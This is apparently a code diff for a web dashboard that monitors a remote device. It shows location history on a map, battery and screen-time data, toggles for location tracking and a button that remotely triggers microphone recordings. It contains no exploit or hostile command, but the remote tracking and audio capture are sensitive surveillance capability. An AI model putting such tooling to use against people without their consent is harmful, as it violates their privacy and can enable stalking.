+            <div class="flex gap-2 mb-2">
+                <button type="button" id="enable-location-btn" class="flex-1 flex items-center justify-center gap-1.5 text-xs font-medium bg-emerald-600 hover:bg-emerald-700 text-white px-3 py-2 rounded-lg transition">
+                    <i class="ti ti-map-pin text-sm"></i> Enable
+                </button>
+                <button type="button" id="disable-location-btn" class="flex-1 flex items-center justify-center gap-1.5 text-xs font-medium bg-gray-200 hover:bg-gray-300 text-gray-700 px-3 py-2 rounded-lg transition">
+                    <i class="ti ti-map-pin-off text-sm"></i> Disable
+                </button>
+            </div>
+            <button type="button" id="refresh-location-btn" class="w-full flex items-center justify-center gap-1.5 text-xs font-medium border border-gray-200 bg-white hover:bg-gray-50 text-gray-600 px-3 py-2 rounded-lg transition">
+                <i id="refresh-loc-icon" class="ti ti-refresh text-sm"></i> Refresh device status
+            </button>
+        </div>
+    </div>
+
+    <!-- Location history table -->
+    <div class="bg-white rounded-2xl border border-gray-200 p-5 mb-4" style="height:420px; display:flex; flex-direction:column;">
+        <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-3 flex items-center gap-1.5 flex-shrink-0"><i class="ti ti-table"></i> Location history</p>
+        <div class="overflow-y-auto scroller flex-1 pr-1">
+            <table class="w-full text-left">
+                <thead class="sticky top-0 bg-white z-10">
+                    <tr class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest border-b border-gray-100">
+                        <th class="pb-2 pr-3">Time</th>
+                        <th class="pb-2 pr-3">Lat</th>
+                        <th class="pb-2 pr-3">Lon</th>
+                        <th class="pb-2 pr-3">Speed</th>
+                        <th class="pb-2 pr-3">Bat</th>
+                        <th class="pb-2">Gap</th>
+                    </tr>
+                </thead>
+                <tbody id="history-table" class="text-xs text-gray-600"></tbody>
+            </table>
+        </div>
+        <div id="pagination" class="flex items-center justify-between pt-3 border-t border-gray-100 flex-shrink-0 mt-1">
+            <button onclick="changePage(-1)" id="prev-btn" class="flex items-center gap-1 text-xs font-medium text-gray-400 hover:text-cyan-600 transition disabled:opacity-30" disabled>
+                <i class="ti ti-arrow-left text-sm"></i> Prev
+            </button>
+            <span id="page-info" class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest">Page 1</span>
+            <button onclick="changePage(1)" id="next-btn" class="flex items-center gap-1 text-xs font-medium text-gray-400 hover:text-cyan-600 transition disabled:opacity-30" disabled>
+                Next <i class="ti ti-arrow-right text-sm"></i>
+            </button>
+        </div>
+    </div>
+
+    <!-- Battery history table -->
+    <div class="bg-white rounded-2xl border border-gray-200 p-5 mb-4">
+        <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-3 flex items-center gap-1.5"><i class="ti ti-battery-2"></i> Battery history</p>
+        <div class="overflow-y-auto scroller pr-1 max-h-80">
+            <table class="w-full text-left">
+                <thead class="sticky top-0 bg-white z-10">
+                    <tr class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest border-b border-gray-100">
+                        <th class="pb-2 pr-4">Time</th>
+                        <th class="pb-2 pr-4">Level</th>
+                        <th class="pb-2">Gap</th>
+                    </tr>
+                </thead>
+                <tbody id="battery-history-table" class="text-xs text-gray-600"></tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Audio recording -->
+    <div class="bg-white rounded-2xl border border-gray-200 p-5">
+        <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-4">
+            <div>
+                <p class="text-[10px] font-semibold text-gray-400 uppercase tracking-widest mb-1 flex items-center gap-1.5"><i class="ti ti-microphone"></i> Audio recording</p>
+                <p class="text-xs text-gray-500">Trigger a new device recording and manage saved clips here.</p>
+            </div>
+            <div class="flex flex-wrap items-center gap-3">
+                <div class="flex items-center gap-2">
+                    <label class="text-xs text-gray-500" for="audio-duration">Duration (s)</label>
+                    <input type="number" id="audio-duration" value="30" min="1" max="60"
+                        class="w-16 border border-gray-200 rounded-lg px-2 py-1.5 text-sm bg-gray-50 focus:outline-none focus:ring-2 focus:ring-red-400">
+                </div>
+                <button onclick="requestAudio()" id="audio-btn"
+                    class="flex items-center gap-2 text-xs font-medium bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg transition disabled:opacity-50">
+                    <i id="audio-icon" class="ti ti-microphone text-sm"></i> Record
+                </button>
+            </div>
+        </div>
+        <div id="audio-list" class="flex flex-col gap-3 max-h-96 overflow-y-auto scroller pr-1"></div>
+    </div>
+
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
+<script>
+function showToast(msg, type = 'info', ms = 4000) {
+    const container = document.getElementById('toast-container');
+    const colors = { success: '#059669', warning: '#d97706', error: '#dc2626', info: '#6366f1' };
+    const toast = document.createElement('div');
+    toast.style.cssText = `background:${colors[type]||colors.info};color:#fff;padding:11px 18px;border-radius:10px;font-size:12px;font-weight:600;box-shadow:0 4px 20px rgba(0,0,0,.25);opacity:0;transform:translateX(40px);transition:all .25s ease;max-width:360px;pointer-events:auto;`;
+    toast.textContent = msg;
+    container.appendChild(toast);
+    requestAnimationFrame(() => { toast.style.opacity='1'; toast.style.transform='translateX(0)'; });
+    setTimeout(() => {
+        toast.style.opacity='0'; toast.style.transform='translateX(40px)';
+        setTimeout(() => toast.remove(), 300);
+    }, ms);
+}
+
+const selectEl = document.getElementById('device-select');
+const tableBody = document.getElementById('history-table');
+const batteryTableBody = document.getElementById('battery-history-table');
+const historyDeviceStatus = document.getElementById('history-device-status');
+const locText = document.getElementById('loc-state-text');
+const locServerText = document.getElementById('loc-server-text');
+const locNote = document.getElementById('loc-state-note');
+const historyPointsCount = document.getElementById('history-points-count');
+const historyPathDistance = document.getElementById('history-path-distance');
+const historyDateRange = document.getElementById('history-date-range');
+const exportHistoryBtn = document.getElementById('export-history-btn');
+const dateInput = document.getElementById('history-date');
+const startHour = document.getElementById('start-hour');
+const endHour = document.getElementById('end-hour');
+const timeDisplay = document.getElementById('time-range-display');
+const refreshLocIcon = document.getElementById('refresh-loc-icon');
+
+const map = L.map('map', { zoomControl: false }).setView([0, 0], 2);
+L.control.zoom({ position: 'bottomright' }).addTo(map);
+L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png').addTo(map);
+
+let pathLine = L.polyline([], { color: '#ef4444', weight: 3.5 }).addTo(map);
+let selectedPathLine = L.polyline([], { color: '#2563eb', weight: 5, opacity: 0.8, dashArray: '10, 8' }).addTo(map);
+let markersGroup = L.layerGroup().addTo(map);
+let historyMarkers = [];
+let currentDataHash = '', cachedAudioFilesStr = '', isFirstLoad = true;
+let currentPage = 1, totalPages = 1;
+let currentHistoryRows = [];
+let selectedHistoryPoints = [];
+
+const today = new Date();
+dateInput.value = `${today.getFullYear()}-${String(today.getMonth()+1).padStart(2,'0')}-${String(today.getDate()).padStart(2,'0')}`;
+
+function setDeviceStatusBadge(online) {
+    const map2 = {
+        online:  `<span class="inline-flex items-center gap-1.5 text-xs font-medium bg-green-100 text-green-700 px-2.5 py-0.5 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Online</span>`,
+        offline: `<span class="inline-flex items-center gap-1.5 text-xs font-medium bg-red-100 text-red-600 px-2.5 py-0.5 rounded-full"><span class="w-1.5 h-1.5 rounded-full bg-current"></span>Offline</span>`,
+    };
+    historyDeviceStatus.innerHTML = map2[online ? 'online' : 'offline'];
+}
+
+function showFilterMessage(msg) {
+    const el = document.getElementById('filter-status');
+    el.textContent = msg;
+    el.style.opacity = 1;
+    setTimeout(() => { el.style.opacity = 0; }, 2000);
+}
+
+function updateTimeDisplay() {
+    let s = parseInt(startHour.value), e = parseInt(endHour.value);
+    if (s > e) { let t = s; s = e; e = t; }
+    timeDisplay.textContent = `${String(s).padStart(2,'0')}:00 – ${String(e).padStart(2,'0')}:00`;
+    setHistoryRangeLabel();
+}
+
+function setHistoryRangeLabel() {
+    historyDateRange.textContent = `${dateInput.value || '—'} ${timeDisplay.textContent}`;
+}
+
+startHour.addEventListener('input', updateTimeDisplay);
+endHour.addEventListener('input', updateTimeDisplay);
+dateInput.addEventListener('change', setHistoryRangeLabel);
+
+document.getElementById('apply-filter-btn').addEventListener('click', () => {
+    resetAndFetchHistory();
+    showFilterMessage('Filter applied');
+    showToast('History filter applied', 'success', 2500);
+});
+
+document.getElementById('reset-filter-btn').addEventListener('click', () => {
+    const t = new Date();
+    dateInput.value = `${t.getFullYear()}-${String(t.getMonth()+1).padStart(2,'0')}-${String(t.getDate()).padStart(2,'0')}`;
+    startHour.value = 0; endHour.value = 24;
+    updateTimeDisplay();
+    showFilterMessage('Filters reset');
+    showToast('History filters reset', 'info', 2500);
+    resetAndFetchHistory();
+});
+
+function getTimeSeconds(row) {
+    if (!row) return null;
+    if (typeof row.unix_time === 'number' && !isNaN(row.unix_time)) return row.unix_time;
+    if (typeof row.unix_time === 'string' && row.unix_time.trim()) {
+        const p = Number(row.unix_time);
+        if (!isNaN(p)) return p;
+    }
+    for (const k of ['time', 'timestamp']) {
+        if (typeof row[k] === 'string' && row[k].trim()) {
+            const ms = Date.parse(row[k]);
+            if (isFinite(ms)) return Math.floor(ms / 1000);
+        }
+    }
+    return null;
+}
+
+function getPointKey(row) {
+    const t = getTimeSeconds(row);
+    if (!row || t == null) return null;
+    return `${t}_${row.lat.toFixed(6)}_${row.lon.toFixed(6)}`;
+}
+
+function getPointIndexByKey(key) {
+    return currentHistoryRows.findIndex(r => getPointKey(r) === key);
+}
+
+function getSelectedIndexes() {
+    return selectedHistoryPoints.map(k => getPointIndexByKey(k)).filter(i => i >= 0).sort((a,b) => a-b);
+}
+
+function calculateDistanceMeters(points) {
+    if (!points || points.length < 2) return 0;
+    const toRad = x => x * Math.PI / 180;
+    let total = 0;
+    for (let i = 1; i < points.length; i++) {
+        const [lat1, lon1] = points[i-1], [lat2, lon2] = points[i];
+        const dLat = toRad(lat2-lat1), dLon = toRad(lon2-lon1);
+        const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1))*Math.cos(toRad(lat2))*Math.sin(dLon/2)**2;
+        total += 6371000 * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+    }
+    return total;
+}
+
+function formatDistance(m) {
+    return m >= 1000 ? `${(m/1000).toFixed(2)} km` : `${Math.round(m)} m`;
+}
+
+function formatSpeed(ms) {
+    if (!ms || ms <= 0) return '0.0 km/h';
+    return `${(ms*3.6).toFixed(1)} km/h`;
+}
+
+function formatMediaDuration(s) {
+    if (!s || isNaN(s) || s <= 0) return '0:00';
+    return `${Math.floor(s/60)}:${Math.round(s%60).toString().padStart(2,'0')}`;
+}
+
+function getPointSpeed(index, rows) {
+    if (!rows || index < 0 || index >= rows.length) return '0.0 km/h';
+    const row = rows[index];
+    if (row.speed !== undefined && row.speed !== null) return `${row.speed} km/h`;
+    const prev = rows[index-1];
+    if (!prev) return '0.0 km/h';
+    const ct = getTimeSeconds(row), pt = getTimeSeconds(prev);
+    if (ct == null || pt == null) return '0.0 km/h';
+    const td = Math.abs(ct-pt);
+    if (td <= 0) return '0.0 km/h';
+    return formatSpeed(calculateDistanceMeters([[prev.lat,prev.lon],[row.lat,row.lon]]) / td);
+}
+
+function setAudioDuration(element) {
+    const label = element.closest('div').querySelector('.audio-duration-label');
+    if (label) label.textContent = formatMediaDuration(element.duration);
+}
+
+function createHistoryMarker(row, index) {
+    const key = getPointKey(row);
+    const isSelected = selectedHistoryPoints.includes(key);
+    const icon = L.divIcon({
+        className: 'history-marker',
+        html: `<div class="${isSelected ? 'bg-blue-600' : 'bg-red-500'} rounded-full w-3 h-3 border-2 border-white shadow"></div>`,
+        iconSize: [12, 12],
+    });
+    const marker = L.marker([row.lat, row.lon], { icon })
+        .bindPopup(`<div class="text-xs"><b>${new Date(row.unix_time*1000).toLocaleString()}</b><br>Speed: ${getPointSpeed(index, currentHistoryRows)}<br>Battery: ${row.level}%</div>`)
+        .on('click', e => handleMapPointClick(e, key));
+    marker.rowKey = key;
+    return marker;
+}
+
+function updateMarkerStyles() {
+    historyMarkers.forEach(m => {
+        const html = `<div class="${selectedHistoryPoints.includes(m.rowKey) ? 'bg-blue-600' : 'bg-red-500'} rounded-full w-3 h-3 border-2 border-white shadow"></div>`;
+        m.setIcon(L.divIcon({ className: 'history-marker', html, iconSize: [12, 12] }));
+    });
+}
+
+function handleMapPointClick(e, key) {
+    if (e.originalEvent.ctrlKey || e.originalEvent.metaKey) {
+        selectedHistoryPoints = selectedHistoryPoints.includes(key)
+            ? selectedHistoryPoints.filter(k => k !== key)
+            : [...(selectedHistoryPoints.length >= 2 ? [selectedHistoryPoints[1]] : selectedHistoryPoints), key];
+        updateSelectionSummary(); renderSelectedRowStyles(); updateMarkerStyles(); updateSelectionLine();
+        return;
+    }
+    const idx = getPointIndexByKey(key);
+    const row = currentHistoryRows[idx];
+    if (row) map.setView([row.lat, row.lon], 17);
+}
+
+function updateSelectionLine() {
+    const idxs = getSelectedIndexes();
+    if (idxs.length < 2) { selectedPathLine.setLatLngs([]); return; }
+    const seg = currentHistoryRows.slice(idxs[0], idxs[idxs.length-1]+1).map(r => [r.lat, r.lon]);
+    selectedPathLine.setLatLngs(seg).bringToFront();
+}
+
+function handleHistoryRowClick(event, key) {
+    if (event.ctrlKey || event.metaKey) {
+        selectedHistoryPoints = selectedHistoryPoints.includes(key)
+            ? selectedHistoryPoints.filter(k => k !== key)
+            : [...(selectedHistoryPoints.length >= 2 ? [selectedHistoryPoints[1]] : selectedHistoryPoints), key];
+        updateSelectionSummary(); renderSelectedRowStyles(); updateMarkerStyles(); updateSelectionLine();
+        return;
+    }
+    const idx = getPointIndexByKey(key);
+    const row = currentHistoryRows[idx];
+    if (row) map.setView([row.lat, row.lon], 17);
+}
+
+function getSelectedRangeInfo() {
+    if (selectedHistoryPoints.length < 2) return null;
+    const idxs = getSelectedIndexes();
+    if (idxs.length < 2) return null;
+    const startRow = currentHistoryRows[idxs[0]], endRow = currentHistoryRows[idxs[idxs.length-1]];
+    const st = getTimeSeconds(startRow), et = getTimeSeconds(endRow);
+    if (!startRow || !endRow || st == null || et == null) return null;
+    const totalTime = Math.abs(et-st);
+    let totalDistance = 0;
+    for (let i = idxs[0]; i < idxs[idxs.length-1]; i++) {
+        const c = currentHistoryRows[i], n = currentHistoryRows[i+1];
+        if (c && n) totalDistance += calculateDistanceMeters([[c.lat,c.lon],[n.lat,n.lon]]);
+    }
+    return { startTime: new Date(st*1000), endTime: new Date(et*1000), totalTime, totalDistance,
+        avgSpeedMs: totalTime > 0 ? totalDistance/totalTime : 0, pointCount: idxs[idxs.length-1]-idxs[0]+1 };
+}
+
+function updateSelectionSummary() {
+    const el = document.getElementById('history-selection-summary');
+    const info = getSelectedRangeInfo();
+    if (!info) {
+        el.innerHTML = `<p class="font-semibold text-gray-700 mb-1">Selected point summary</p><p class="text-gray-400">Ctrl/cmd-click two rows to compare points.</p>`;
+        return;
+    }
+    el.innerHTML = `<p class="font-semibold text-gray-700 mb-2">Selected range summary</p>
+        <div class="flex flex-col gap-1">
+            <div class="flex justify-between"><span class="text-gray-400">Start</span><span>${info.startTime.toLocaleString()}</span></div>
+            <div class="flex justify-between"><span class="text-gray-400">End</span><span>${info.endTime.toLocaleString()}</span></div>
+            <div class="flex justify-between"><span class="text-gray-400">Duration</span><span>${Math.floor(info.totalTime/3600)}h ${Math.floor((info.totalTime%3600)/60)}m ${info.totalTime%60}s</span></div>
+            <div class="flex justify-between"><span class="text-gray-400">Distance</span><span>${formatDistance(info.totalDistance)}</span></div>
+            <div class="flex justify-between"><span class="text-gray-400">Avg speed</span><span>${formatSpeed(info.avgSpeedMs)}</span></div>
+            <div class="flex justify-between"><span class="text-gray-400">Points</span><span>${info.pointCount}</span></div>
+        </div>`;
+}
+
+function renderSelectedRowStyles() {
+    const rows = tableBody.querySelectorAll('tr');
+    rows.forEach((tr, idx) => {
+        const key = getPointKey(currentHistoryRows[idx]);
+        if (key && selectedHistoryPoints.includes(key)) tr.classList.add('bg-blue-50', 'text-blue-900');
+        else tr.classList.remove('bg-blue-50', 'text-blue-900');
+    });
+}
+
+async function fetchAvailableDevices() {
+    try {
+        const res = await fetch('/devices');
+        if (!res.ok) return;
+        const data = await res.json();
+        const devices = data.devices || [];
+        const prev = selectEl.value;
+        selectEl.innerHTML = '';
+        if (!devices.length) { selectEl.innerHTML = '<option value="">No devices</option>'; return; }
+        devices.forEach(d => {
+            const opt = document.createElement('option');
+            opt.value = d; opt.textContent = d; selectEl.appendChild(opt);
+        });
+        selectEl.value = devices.includes(prev) ? prev : devices[0];
+    } catch(e) { console.error(e); }
+}
+
+async function setLocationTracking(enable) {
+    const activeDevice = selectEl.value;
+    if (!activeDevice) { showToast('No device selected', 'warning'); return; }
+    const fd = new FormData();
+    fd.append('device_id', activeDevice);
+    fd.append('enable', enable);
+    try {
+        const res = await fetch('/set_location_tracking', { method: 'POST', body: fd });
+        if (res.ok) {
+            showToast(enable ? 'Location tracking enabled' : 'Location tracking disabled', 'success');
+            refreshLocationState();
+        } else showToast('Failed to update location tracking', 'error');
+    } catch(e) {
+        console.error(e);
+        showToast('Could not reach server', 'error');
+    }
+}
+
+async function refreshLocationState() {
+    const activeDevice = selectEl.value;
+    if (!activeDevice) return;
+    refreshLocIcon.className = 'ti ti-refresh text-sm spinning';
+    locText.textContent = '…';
+    locNote.textContent = 'Checking device connectivity…';
+    const fd = new FormData();
+    fd.append('device_id', activeDevice);
+    try {
+        const [checkRes, statsRes] = await Promise.all([
+            fetch('/check_location_state', { method: 'POST', body: fd }),
+            fetch(`/stats?device_id=${encodeURIComponent(activeDevice)}`)
+        ]);
+        const checkData = checkRes.ok ? await checkRes.json() : null;
+        const statsData = statsRes.ok ? await statsRes.json() : null;
+        if (statsData) locServerText.textContent = statsData.location_tracking === 1 ? 'ON' : 'OFF';
+        if (checkData && checkData.loc_state !== null) {
+            locText.textContent = checkData.loc_state === 1 ? 'ON' : 'OFF';
+            locNote.textContent = checkData.connected ? 'Device reachable; verified tracking state from device.' : 'Last known device state used.';
+        } else {
+            locText.textContent = statsData ? locServerText.textContent : 'ERR';
+            locNote.textContent = checkData?.connected ? 'Device reachable but state verification timed out; showing server state.' : 'Device unreachable; showing server state.';
+        }
+    } catch(e) {
+        locText.textContent = 'ERR';
+        locNote.textContent = 'Could not refresh location state.';
+        showToast('Location refresh failed', 'error');
+    }
+    finally { refreshLocIcon.className = 'ti ti-refresh text-sm'; }
+}
+
+async function fetchDeviceStatus() {
+    const activeDevice = selectEl.value;
+    if (!activeDevice) return;
+    try {
+        const res = await fetch(`/stats?device_id=${encodeURIComponent(activeDevice)}`);
+        const data = await res.json();
+        setDeviceStatusBadge(data.is_online);
+        if (data.location_tracking !== undefined) {
+            locServerText.textContent = data.location_tracking === 1 ? 'ON' : 'OFF';
+        }
+    } catch(e) { setDeviceStatusBadge(false); }
+}
+
+function resetAndFetchHistory() {
+    currentDataHash = ''; isFirstLoad = true; currentPage = 1;
+    selectedHistoryPoints = []; updateSelectionSummary();
+    fetchHistory(); fetchScreenTimeSummary(); fetchDeviceStatus();
+}
+
+function changePage(delta) {
+    const np = currentPage + delta;
+    if (np < 1 || np > totalPages) return;
+    currentPage = np; currentDataHash = '';
+    fetchHistory();
+}
+
+function updatePagination() {
+    document.getElementById('page-info').textContent = `Page ${currentPage} / ${totalPages}`;
+    document.getElementById('prev-btn').disabled = currentPage <= 1;
+    document.getElementById('next-btn').disabled = currentPage >= totalPages;
+}
+
+function buildTimeQuery() {
+    const selDateStr = dateInput.value;
+    if (!selDateStr) return '';
+    let s = parseInt(startHour.value), e = parseInt(endHour.value);
+    if (s > e) { let t = s; s = e; e = t; }
+    const [y, m, d] = selDateStr.split('-');
+    const startDate = new Date(y, m-1, d);
+    startDate.setHours(s, 0, 0, 0);
+    const endDate = new Date(y, m-1, d);
+    if (e === 24) endDate.setHours(23, 59, 59, 999); else endDate.setHours(e, 0, 0, 0);
+    return `&start_time=${startDate.getTime()/1000}&end_time=${endDate.getTime()/1000}`;
+}
+
+async function fetchBatteryHistory() {
+    const activeDevice = selectEl.value;
+    if (!activeDevice) return;
+    try {
+        const res = await fetch(`/battery_history?device_id=${encodeURIComponent(activeDevice)}${buildTimeQuery()}`);
+        const data = await res.json();
+        batteryTableBody.innerHTML = '';
+        if (data.history && data.history.length > 0) {
+            batteryTableBody.innerHTML = data.history.map(row => {
+                const timeStr = row.unix_time ? new Date(row.unix_time*1000).toLocaleString() : row.time;
+                const gap = row.gap_seconds || 0;
+                let gapText = '—';
+                if (gap > 0) {
+                    if (gap < 60) gapText = `${gap}s`;
+                    else if (gap < 3600) gapText = `${Math.floor(gap/60)}m ${gap%60}s`;
+                    else gapText = `${Math.floor(gap/3600)}h ${Math.floor((gap%3600)/60)}m`;
                 }
+                const lvlCls = row.level < 20 ? 'text-red-600' : 'text-emerald-600';
+                return `<tr class="border-b border-gray-50 hover:bg-gray-50">
+                    <td class="py-1.5 pr-4 font-mono">${timeStr}</td>
+                    <td class="pr-4 font-semibold ${lvlCls}">${row.level}%</td>
+                    <td class="text-gray-400">${gapText}</td></tr>`;
+            }).join('');
+        } else {
+            batteryTableBody.innerHTML = `<tr><td colspan="3" class="py-4 text-center text-gray-400">No battery history for this period.</td></tr>`;
+        }
+    } catch(e) { console.error(e); }
+}
+
+async function fetchScreenTimeSummary() {
+    const activeDevice = selectEl.value;
+    if (!activeDevice) return;
+    const date = dateInput.value || today.toISOString().slice(0, 10);
+    try {
+        const res = await fetch(`/screen_time_summary?device_id=${encodeURIComponent(activeDevice)}&date=${encodeURIComponent(date)}`);
+        if (!res.ok) { document.getElementById('daily-screen-time-text').textContent = '0h 0m'; return; }
+        const data = await res.json();
+        const mins = parseInt(data.minutes || 0);
+        document.getElementById('daily-screen-time-text').textContent = `${Math.floor(mins/60)}h ${mins%60}m`;
+    } catch(e) { console.error(e); }
+}
+
+async function fetchHistory() {
+    const activeDevice = selectEl.value;
+    if (!activeDevice) return;
+    try {
+        const qs = `?device_id=${encodeURIComponent(activeDevice)}&page=${currentPage}&per_page=100${buildTimeQuery()}`;
+        await fetchScreenTimeSummary();
+        await fetchBatteryHistory();
+        const res = await fetch(`/history_detailed${qs}`);
+        const data = await res.json();
+        if (!data.history) return;
+        currentHistoryRows = Array.isArray(data.history) ? data.history : [];
+        totalPages = data.total_pages || 1;
+        updatePagination();
+
+        const firstTime = data.history[0]?.time || '';
+        const lastTime = data.history[data.history.length-1]?.time || '';
+        const newHash = data.history.length > 0 ? `${dateInput.value}_${startHour.value}_${endHour.value}_${currentPage}_${firstTime}_${lastTime}_${data.history.length}` : 'empty';
+        if (newHash === currentDataHash) return;
+        currentDataHash = newHash;
+
+        tableBody.innerHTML = '';
+        markersGroup.clearLayers();
+        historyMarkers = [];
+
+        if (data.history.length > 0) {
+            selectedHistoryPoints = selectedHistoryPoints.filter(k => getPointIndexByKey(k) >= 0);
+            updateSelectionSummary();
+            updateSelectionLine();
+            const points = data.history.map(r => [r.lat, r.lon]);
+            pathLine.setLatLngs(points);
+            historyPointsCount.textContent = points.length;
+            historyPathDistance.textContent = formatDistance(calculateDistanceMeters(points));
+            setHistoryRangeLabel();
+
+            const step = Math.max(1, Math.floor(data.history.length / 100));
+            let html = '';
+            data.history.forEach((row, i) => {
+                const timeOnly = row.unix_time
+                    ? new Date(row.unix_time*1000).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', second:'2-digit'})
+                    : (row.time.split(' ')[1] || row.time);
+                if (i % step === 0 || i === 0 || i === data.history.length-1) {
+                    const marker = createHistoryMarker(row, i).addTo(markersGroup);
+                    historyMarkers.push(marker);
+                }
+                let gapStr = '—';
+                if (i < data.history.length-1 && row.unix_time && data.history[i+1].unix_time) {
+                    const gs = Math.max(0, row.unix_time - data.history[i+1].unix_time);
+                    const raw = gs < 60 ? `${Math.floor(gs)}s` : gs < 3600 ? `${Math.floor(gs/60)}m` : `${Math.floor(gs/3600)}h ${Math.floor((gs%3600)/60)}m`;
+                    gapStr = gs > 300 ? `<span class="text-red-500 font-semibold">${raw}</span>` : `<span class="text-gray-400">${raw}</span>`;
+                }
+                const pointKey = getPointKey(row);
+                const speedLabel = getPointSpeed(i, data.history);
+                const selCls = selectedHistoryPoints.includes(pointKey) ? 'bg-blue-50 text-blue-900' : '';
+                const batCls = row.level < 20 ? 'text-red-500 font-semibold' : 'text-emerald-600';
+                html += `<tr class="border-b border-gray-50 hover:bg-blue-50 cursor-pointer ${selCls}" onclick="handleHistoryRowClick(event,'${pointKey}')">
+                    <td class="py-1.5 pr-3 font-mono font-semibold whitespace-nowrap">${timeOnly}</td>
+                    <td class="pr-3">${row.lat.toFixed(4)}</td>
+                    <td class="pr-3">${row.lon.toFixed(4)}</td>
+                    <td class="pr-3">${speedLabel}</td>
+                    <td class="pr-3 ${batCls}">${row.level}%</td>
+                    <td>${gapStr}</td></tr>`;
             });
+            tableBody.innerHTML = html;
+            updateSelectionSummary();
+            renderSelectedRowStyles();
+            updateMarkerStyles();
+            updateSelectionLine();
+            const bounds = pathLine.getBounds();
+            if (bounds.isValid()) map.fitBounds(bounds, { padding: [40, 40] });
+        } else {
+            historyPointsCount.textContent = '0';
+            historyPathDistance.textContent = '0 m';
+            setHistoryRangeLabel();
+            tableBody.innerHTML = `<tr><td colspan="6" class="py-8 text-center text-gray-400">No location data for this period.</td></tr>`;
         }
+    } catch(e) { console.error(e); }
+}
 
-        async function fetchDeviceStatus() {
-            const activeDevice = selectEl.value;
-            if (!activeDevice) return;
-            try {
-                const res = await fetch(`/stats?device_id=${encodeURIComponent(activeDevice)}`);
-                const data = await res.json();
-                historyStatusText.textContent = data.is_online ? 'Online' : 'Offline';
-                if (data.location_tracking !== undefined) {
-                    locServerText.textContent = data.location_tracking === 1 ? 'ON' : 'OFF';
-                }
-            } catch (e) {
-                historyStatusText.textContent = 'Offline';
-                locServerText.textContent = '?';
-            }
-        }
-
-        function resetAndFetchHistory() { currentDataHash = ""; isFirstLoad = true; currentPage = 1; selectedHistoryPoints = []; updateSelectionSummary(); fetchHistory(); fetchScreenTimeSummary(); fetchDeviceStatus(); }
-
-        async function fetchBatteryHistory() {
-            const activeDevice = selectEl.value;
-            if (!activeDevice) return;
-            try {
-                let qs = `?device_id=${encodeURIComponent(activeDevice)}`;
-                const selDateStr = dateInput.value;
-                if (selDateStr) {
-                    let s = parseInt(startHour.value);
-                    let e = parseInt(endHour.value);
-                    if (s > e) { let tmp = s; s = e; e = tmp; }
-                    const [y, m, d] = selDateStr.split('-');
-                    const startDate = new Date(y, m - 1, d);
-                    startDate.setHours(s, 0, 0, 0);
-                    const endDate = new Date(y, m - 1, d);
-                    if (e === 24) { endDate.setHours(23, 59, 59, 999); } else { endDate.setHours(e, 0, 0, 0); }
-                    qs += `&start_time=${startDate.getTime()/1000}&end_time=${endDate.getTime()/1000}`;
-                }
-                const res = await fetch(`/battery_history${qs}`);
-                const data = await res.json();
-                batteryTableBody.innerHTML = '';
-                if (data.history && data.history.length > 0) {
-                    let html = '';
-                    data.history.forEach(row => {
-                        let timeStr = row.time;
-                        if (row.unix_time) {
-                            timeStr = new Date(row.unix_time * 1000).toLocaleString();
-                        }
-                        const gap = row.gap_seconds || 0;
-                        let gapText = '-';
-                        if (gap > 0) {
-                            if (gap < 60) gapText = `${gap}s`;
-                            else if (gap < 3600) gapText = `${Math.floor(gap/60)}m ${gap % 60}s`;
-                            else gapText = `${Math.floor(gap/3600)}h ${Math.floor((gap%3600)/60)}m`;
-                        }
-                        html += `<tr class="border-b hover:bg-blue-50"><td class="py-2 text-xs font-mono">${timeStr}</td><td class="text-xs font-bold">${row.level}%</td><td class="text-xs">${gapText}</td></tr>`;
-                    });
-                    batteryTableBody.innerHTML = html;
-                } else {
-                    batteryTableBody.innerHTML = `<tr><td colspan="3" class="py-4 text-center text-xs text-gray-500">No battery history for this period.</td></tr>`;
-                }
-            } catch (e) {
-                console.error(e);
-            }
-        }
-
-        async function fetchScreenTimeSummary() {
-            const activeDevice = selectEl.value;
-            if (!activeDevice) return;
-            const date = dateInput.value || today.toISOString().slice(0, 10);
-            try {
-                const res = await fetch(`/screen_time_summary?device_id=${encodeURIComponent(activeDevice)}&date=${encodeURIComponent(date)}`);
-                if (!res.ok) {
-                    document.getElementById('daily-screen-time-text').textContent = '0h 0m';
+async function fetchAudioList() {
+    const activeDevice = selectEl.value;
+    if (!activeDevice) return;
+    try {
+        const res = await fetch(`/audio_files?device_id=${encodeURIComponent(activeDevice)}`);
+        const data = await res.json();
+        const str = JSON.stringify(data.files || []);
+        if (str === cachedAudioFilesStr) return;
+        cachedAudioFilesStr = str;
+        const listEl = document.getElementById('audio-list');
+        listEl.innerHTML = '';
+        if (data.files && data.files.length > 0) {
+            data.files.forEach(item => {
+                const filename = item.name;
+                if (filename.includes('BUSY')) {
+                    listEl.innerHTML += `<div class="bg-red-50 border border-red-200 p-3 rounded-xl text-red-700 text-xs font-medium flex items-center gap-2"><i class="ti ti-microphone-off text-sm"></i> Mic busy — a recording request failed because the mic was in use.</div>`;
                     return;
                 }
-                const data = await res.json();
-                const minutes = parseInt(data.minutes || 0, 10);
-                document.getElementById('daily-screen-time-text').textContent = `${Math.floor(minutes/60)}h ${minutes % 60}m`;
-            } catch(e) {
-                console.error(e);
-            }
-        }
+                const isFlagged = item.flagged;
+                const displayName = filename.replace(/_FLAG(?=\.[^.]+$)/gi, '');
+                const fileTime = item.timestamp || 'Recorded time unknown';
+                const fileSize = item.size ? `${(item.size/1024).toFixed(1)} KB` : '';
+                const flagBadge = isFlagged
+                    ? `<span class="text-[10px] font-semibold uppercase bg-orange-100 text-orange-700 px-2 py-0.5 rounded-full">Flagged</span>`
